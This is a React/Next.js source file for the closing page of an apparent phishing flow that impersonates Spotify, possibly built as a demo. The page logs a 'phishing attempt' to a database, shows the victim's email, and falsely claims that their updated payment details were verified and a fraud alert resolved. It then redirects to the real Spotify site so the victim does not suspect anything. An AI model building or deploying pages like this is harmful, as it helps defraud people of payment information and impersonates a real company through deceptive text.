"use client"

import { useEffect, useState } from "react";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { ShieldCheck } from "lucide-react";
import Link from "next/link";
import Image from "next/image";
import { savePhishingAttempt } from "@/lib/supabase";

export default function ThankYouPage() {
  const [countdown, setCountdown] = useState(5);
  const [userEmail, setUserEmail] = useState("");

  useEffect(() => {
    // Try to get the email from localStorage
    const email = localStorage.getItem("userEmail");
    if (email) {
      setUserEmail(email);
    }

    // Record that the phishing attempt was completed
    const recordAttempt = async () => {
      try {
        await savePhishingAttempt();
      } catch (error) {
        console.error("Error recording phishing attempt:", error);
        // Continue anyway for the demo
      }
    };

    recordAttempt();

    // Set up the redirect countdown
    if (countdown > 0) {
      const timer = setTimeout(() => {
        setCountdown(countdown - 1);
      }, 1000);

      return () => clearTimeout(timer);
    } else {
      window.location.href = "https://www.spotify.com";
    }
  }, [countdown]);

  return (
    <div className="min-h-screen bg-[#121212] text-white flex flex-col">
      {/* Header */}
      <header className="bg-black p-4 flex items-center justify-between">
        <div className="flex items-center space-x-2">
          <Link href="/">
            <Image
              src="/spotify-logo.svg"
              alt="Spotify"
              width={132}
              height={40}
              className="h-10 w-auto"
            />
          </Link>
        </div>

        {userEmail && (
          <div className="flex items-center space-x-4">
            <div className="bg-[#282828] rounded-full h-8 w-8 flex items-center justify-center">
              <span className="text-white text-sm font-medium">{userEmail.charAt(0).toUpperCase()}</span>
            </div>
            <span className="text-white font-medium">{userEmail}</span>
          </div>
        )}
      </header>

      <main className="flex-1 flex items-center justify-center p-6">
        <Card className="bg-[#181818] border-green-900 border p-8 shadow-lg max-w-xl w-full text-center">
          <div className="flex flex-col items-center">
            <div className="bg-green-900 rounded-full p-4 mb-6">
              <ShieldCheck className="h-12 w-12 text-green-500" />
            </div>

            <h1 className="text-2xl font-bold text-white mb-4">
              Account Security Resolved
            </h1>

            <p className="text-gray-300 mb-6">
              Thank you for updating your payment information. Your Spotify Premium account is now secure, and the fraud alert has been resolved.
            </p>

            <div className="mb-6 p-4 bg-[#282828] rounded-md">
              <p className="text-white">
                Our security team has verified your payment details and removed the security flag from your account. All your playlists, saved content, and premium features remain intact.
              </p>
            </div>

            <Button
              className="w-full bg-[#1ed760] hover:bg-[#1fdf64] text-black font-semibold rounded-full py-6"
              onClick={() => window.location.href = "https://www.spotify.com"}
            >
              Return to Spotify
            </Button>

            <p className="mt-6 text-gray-400">
              Redirecting to Spotify in <span className="text-white font-bold">{countdown}</span> seconds...
            </p>
          </div>
        </Card>
      </main>

      {/* Footer */}
      <footer className="bg-black py-6 px-8 text-center text-gray-400 text-sm">
        <p>© 2025 Spotify</p>
      </footer>
    </div>
  );
}
